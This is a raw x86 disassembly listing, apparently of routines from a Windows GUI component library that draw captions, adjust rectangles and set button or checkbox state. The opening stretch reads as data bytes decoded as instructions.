add [ eax ] al
adc [ eax + eax + 0x50 ] eax
outsd
inc ebx
add al ch
or eax 0x6fa80044
inc ebx
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax + 0x54 ] eax
adc [ eax + eax - 0x4 ] al
cmove eax [ eax ]
je r-xdata
jne r-xdata
inc esp
add [ edx + ebx + 0x44 ] al
add [ ebp + ecx * 2 + 0x38f00044 ] dh
inc esp
add al ah
cmp eax [ eax + eax - 0x40 ]
insd
inc ebx
add ah al
outsb
inc ebx
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0xd4ff
popad
add [ eax ] al
je r-xdata
xchg [ ebx ] al
outsb
nop
push esp
push esi
inc ebx
add [ edi ] al
or al 0x54
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
pop eax
push ebp
inc ebx
add [ ebx + ecx * 2 + 0x350043 ] bl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
push [ eax ]
add dh bh
test al 0xd5
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3865646f
xchg [ ebx ] al
test ah dl
inc ebx
add [ esp + edx * 8 - 0xb8bffbd ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
insb
jae r-xdata
cmp eax 0x3dc40044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
hlt
add [ eax + 0x2c ] ah
inc ecx
add [ eax + eax ] bh
add dh bh
clc
mov [ ebx ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ ecx + eax * 2 ] dl
add [ eax ] dl
add al [ eax ]
push esp
insd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
nop
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
xor eax [ eax + edx * 2 + 0x7f ]
inc ebx
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
jae r-xdata
add bh bh
js r-xdata
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
inc ebx
add [ eax + 0x43d5 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
test [ ebx ] eax
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
sub_435c58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445874
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_43cc40
mov edx 0x69
mov eax esi
call sub_43cc64
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_435cb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fccc
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_41ecb4
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_41ec10
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_435d20
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4360c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_41ecb4
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_41ec10
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_43d484
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_412cd4
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_412cd4
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x54 ]
call sub_4041b8
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x58 ]
call sub_4043b8
push eax
mov eax edi
call sub_41ed94
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_412cd4
mov eax ebx
mov si 0xffc8
call sub_403320
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_41e64c
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_41e64c
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41ea2c
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_41e64c
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_41ed94
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4360c9
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403f1c
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x60 ]
call sub_4045d8
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403f1c
retn
mov eax ebx
mov si 0xffc8
call sub_403320
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_41ea2c
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_43d484
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_43d484
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_41ebf4
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_412cd4
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_412cd4
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_43d484
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404724
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_41ed94
push eax
call sub_4335f0
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4338d0
jmp r-xdata
call sub_4335f0
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_433934
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_41ed94
push eax
call sub_4335f0
lea ecx [ ebp - 0x4c ]
pop edx
call sub_4337dc
push 0x0
mov eax edi
call sub_41ed94
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_43d484
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_43f758
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x80 ]
call sub_4041b8
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x84 ]
call sub_4043b8
push eax
mov eax edi
call sub_41ed94
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_41e64c
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x88 ]
call sub_4041b8
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_43d484
mov eax [ ebp - 0x8c ]
call sub_4043b8
push eax
mov eax edi
call sub_41ed94
push eax
call DrawTextA
sub_4360d3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43614e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d484
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4545a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4430e4
mov eax ebx
mov si 0xffb8
call sub_403320
test al al
je r-xdata
mov eax ebx
call sub_4441c0
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436155
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_4361a0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_444df4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_43cc40
mov edx 0x11
mov eax esi
call sub_43cc64
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_43624c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4363a2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x90 ]
test esi 0x400
je r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43f758
mov esi eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_41ecb4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
or esi 0x800
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041c0
cmp [ ebx + 0x170 ] 0x0
je r-xdata
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041b8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x160 ]
call sub_41ed94
push eax
call DrawTextA
push 0x1
push 0x1
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000014
call sub_41de80
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041b8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x160 ]
call sub_41ed94
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
push edi
call OffsetRect
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff000010
call sub_41de80
push esi
push edi
mov eax [ ebp - 0x4 ]
call sub_4041b8
push eax
mov eax [ ebp - 0x4 ]
call sub_4043b8
push eax
mov eax [ ebx + 0x160 ]
call sub_41ed94
push eax
call DrawTextA
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x26
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4363a9
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x0
jne r-xdata
sub_4363b3
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffd0
mov ebx eax
mov esi [ ebx + 0x160 ]
mov eax ebx
call sub_4365dc
test al al
jne r-xdata
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41e768
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
mov al [ ebx + 0x16f ]
mov di [ eax * 2 + rw-data ]
or di 0x40
xor eax eax
mov al [ ebx + 0x16c ]
or di [ eax * 2 + rw-data ]
movzx edi di
cmp [ ebx + 0x16e ] 0x0
je r-xdata
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41e64c
xor edx edx
mov eax [ esi + 0x14 ]
call sub_41e768
lea edx [ esp + 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ esp + 0x20 ]
mov eax esi
call sub_41e9f0
mov edx esp
mov ecx edi
mov eax ebx
mov si 0xffc6
call sub_403320
add esp 0x30
pop edi
pop esi
pop ebx
retn
push edi
lea esi [ esp + 0x4 ]
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov ecx edi
or ecx 0x400
lea edx [ esp + 0x10 ]
mov eax ebx
mov si 0xffc6
call sub_403320
cmp [ ebx + 0x16e ] 0x2
jne r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
sar eax 0x1
jns r-xdata
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x1c ]
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
jmp r-xdata
push eax
push 0x0
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
adc eax 0x0
sub_4364d4
push ebx
push esi
push edi
add esp 0xffffffec
mov edi eax
test [ edi + 0x1c ] 0x2
jne r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x16d ] 0x0
je r-xdata
lea edx [ esp + 0x1 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x0
call GetDC
mov ebx eax
mov edx ebx
mov eax [ edi + 0x160 ]
call sub_41ee14
xor eax eax
mov al [ edi + 0x16f ]
mov cx [ eax * 2 + rw-data ]
or cx 0x440
movzx ecx cx
lea edx [ esp + 0x1 ]
mov eax edi
mov si 0xffc6
call sub_403320
xor edx edx
mov eax [ edi + 0x160 ]
call sub_41ee14
push ebx
push 0x0
call ReleaseDC
mov ebx [ edi + 0x40 ]
mov al [ edi + 0x16c ]
mov [ esp ] al
mov eax edi
mov si 0xffc8
call sub_403320
test al al
je r-xdata
cmp [ esp ] 0x1
jne r-xdata
mov eax esp
call sub_43a210
mov eax [ esp + 0x9 ]
push eax
mov eax [ esp + 0x11 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ edi + 0x48 ]
sub eax [ esp + 0x9 ]
add ebx eax
sub_436618
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4365dc
cmp bl al
je r-xdata
mov [ esi + 0x188 ] 0x1
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_436678
push esi
push edi
mov edi eax
cmp dl [ edi + 0x16f ]
je r-xdata
pop edi
pop esi
retn
mov [ edi + 0x16f ] dl
mov eax edi
mov si 0xffc7
call sub_403320
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4366a0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43c954
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x168 ]
jne r-xdata
xor eax eax
mov [ edi + 0x168 ] eax
sub_436704
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436791
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436798
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d484
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4545a8
test al al
je r-xdata
mov ebx [ ebx + 0x168 ]
mov eax ebx
mov si 0xffb8
call sub_403320
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
sub_4367e8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f958
mov eax esi
mov edx [ r-xdata ]
call sub_4032d4
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_43680c
push ebx
mov ebx eax
mov eax ebx
call sub_4499bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4032d4
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_436844
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43689a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_4368a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43f98c
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_4368fc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_444730
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_436950
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_436974
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_441674
mov eax ebx
mov si 0xffb5
call sub_403320
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_443c60
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403320
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4369ec
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_4335f0
mov ebx eax
mov eax ebx
call sub_4336d0
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_443c60
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_433868
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_436a38
push ebx
push esi
mov esi edx
mov ebx eax
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4420b4
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_436a64
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440aec
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_436a9c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4368a8
mov edx 0x61
mov eax esi
call sub_43cc40
mov edx 0x11
mov eax esi
call sub_43cc64
mov dl 0x1
mov eax esi
call sub_443e94
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_436b08
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403320
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_436b34
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_436bbc
retn
mov dl 0x2
call sub_436bbc
jmp r-xdata
xor edx edx
call sub_436bbc
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_436bbc
jmp r-xdata
sub_436bbc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_443f64
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_443c60
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403320
sub_436c10
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_436a64
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_440a18
mov eax ebx
mov si 0xffc8
call sub_403320
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_436c6b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x605d173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_443c60
push eax
call SendMessageA
pop ebx
retn
sub_436cb4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_436d42
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_43d484
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_4545a8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4430e4
mov eax ebx
mov si 0xffb8
call sub_403320
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403320
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436d49
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_436d60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4368a8
mov edx 0x71
mov eax esi
call sub_43cc40
mov edx 0x11
mov eax esi
call sub_43cc64
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_436dc8
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403320
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_436e08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_440954
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_449c50
sub_436ec4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
